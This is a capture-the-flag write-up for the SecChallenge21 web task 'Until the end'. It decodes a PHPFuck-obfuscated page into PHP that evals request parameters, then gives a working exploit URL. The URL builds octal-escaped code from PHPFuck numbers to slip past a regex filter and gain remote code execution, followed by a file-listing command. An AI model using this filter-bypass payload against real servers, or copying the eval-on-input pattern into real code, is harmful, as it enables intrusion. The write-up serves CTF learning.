---
layout: post
title: Until the end
description: (([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]).[][[]]^([].[])[([]^[[]])])
permalink: /SecChall21/web/unTILDEend
tags: web secchallenge
hidden: 1
---

## Description

In part2 of Road to Valhalla you found the URL of the server that contains the coordinates of Valhalla. You open the site and see the title of the page “Only those who endure until the end”. So be it traveler endure till the end and you will have your reward!

[https://until-the-end.secchallenge.crysys.hu](https://until-the-end.secchallenge.crysys.hu)

- Author: Pepe
- Difficulty: medium

## Solution

Opening the page, I was greeted with what seemed like `JSFuck`. Oh great, like there wasn't enough brainfuck yet. Turns out, after quite some stupidity and little googling, there exists a language called `PHPFuck`. Wanna know the two differences between the two?

- PHPFuck has an extra `^` symbol in its syntax
- PHPFuck doesn't have a `UnFucker` like JSFuck has [one](http://codertab.com/JsUnFuck)

Alright, let's write an Unfucker in python, what could go wrong? Spoilers: a lot. After wasting about what seemed like a decade, I decided to just search and replace all characters, starting from the longest and going one by one, characters ordered descending by length. This took way less time then trying to automate it. It was like opening a Treasure Chest, the code revealed itself.

```php
<?php

if (isset($_GET[' '])) {
    eval(str_replace('a', str_replace('kekw'), str_rot13(strtoupper(substr($_GET[' '], 42, 69)))));
}
else if (isset($_GET['+'])) {
        if (preg_match('/[b-d\\-0-9H-LA-DU-Xi-kn-s!?TEz.]/', $_GET['+'])) die();
        eval($_GET['+']);
    }
else {
        die();
        shell_exec($_GET['cmd']);
}
?>  
```

Looking at the the code, I soon realized: The only way through this, is through the `preg_match()`. Looking at it in an [online tool](https://regex101.com/), and trying out different things I may want to `eval()` on the server, I quickly realized its not really gonna work, with this much limitations.

Then it dawned on me, `PHPFuck` is the way. The only problem? We can't use `.`, which is kinda in a lot of elements. Workaround time: I could define numbers with the help of PHPFuck, then use numbers inside an other `eval()` (Thank God eval went through the regex) to construct the exploit string via octal chars. So I started with the numbers:
```php
$a=[]^[]; #0
$aa=(([]^[[]])); #1
$aaa=(([]^[[]])+([]^[[]])); #1 + 1 = 2
$aaaa=(([]^[[]])+([]^[[]])+([]^[[]]));
$aaaaa=(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]));
$aaaaaa=(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]));
$aaaaaaa=(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]));
$aaaaaaaa=(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]));
$aaaaaaaaa=(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]));
$aaaaaaaaaa=(([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]])+([]^[[]]));
```
Hopefully you see the pattern :)

Once I had this laying around, we could just use it inside another eval, to construct something like `\145\166\141\154\50\44\137\107\105\124\133\47\143\155\144\47\135\51\73` which would translate to `$_GET['cmd']` which would then be inputed yet into another `eval` finally letting us execute anything we want.

Getting the page printed by `phpinfo()` would look like this:
```
https://until-the-end.secchallenge.crysys.hu/?%2b=%24a=[]^[];%24aa=(([]^[[]]));%24aaa=(([]^[[]])%2b([]^[[]]));%24aaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24aaaaaaaaaa=(([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]])%2b([]^[[]]));%24F="eval(%5c"%5c%5c%24aa%24aaaaa%24aaaaaa%5c%5c%24aa%24aaaaaaa%24aaaaaaa%5c%5c%24aa%24aaaaa%24aa%5c%5c%24aa%24aaaaaa%24aaaaa%5c%5c%24aaaaaa%24a%5c%5c%24aaaaa%24aaaaa%5c%5c%24aa%24aaaa%24aaaaaaaa%5c%5c%24aa%24a%24aaaaaaaa%5c%5c%24aa%24a%24aaaaaa%5c%5c%24aa%24aaa%24aaaaa%5c%5c%24aa%24aaaa%24aaaa%5c%5c%24aaaaa%24aaaaaaaa%5c%5c%24aa%24aaaaa%24aaaa%5c%5c%24aa%24aaaaaa%24aaaaaa%5c%5c%24aa%24aaaaa%24aaaaa%5c%5c%24aaaaa%24aaaaaaaa%5c%5c%24aa%24aaaa%24aaaaaa%5c%5c%24aaaaaa%24aa%5c%5c%24aaaaaaaa%24aaaa%5c");";eval(%24F);&cmd=phpinfo();
```

Are we done yet? Sir! No Sir! Why? Answers are hidden in the `phpinfo` page. There aren't as many Pokemons as there are `disable_functions` entries on this site. Luckily after not too much search, I found the function I needed, and ran a new command: (For obvious reasons, here's only the cmd part of the query)
```
foreach(scandir(".") as $file) echo $file."<br>";
```

This command appends the files and directories found where index.php is located:
```bash
.
..
index.php
very_secret_hidden_folder_N0P3
```

Visiting the last entry, gives us the flag (as well as a hidden easter egg), thank god we endured:
```
cd21{HIDDEN}
```

P.S.: There's also another solution, which I wasn't smart enough to find, but is much shorter and less painful. Thanks Pepe for showing that to me, right after my 2 day duel with this one LUL.

[&#8592; Back to SecChallenge21](/SecChall21)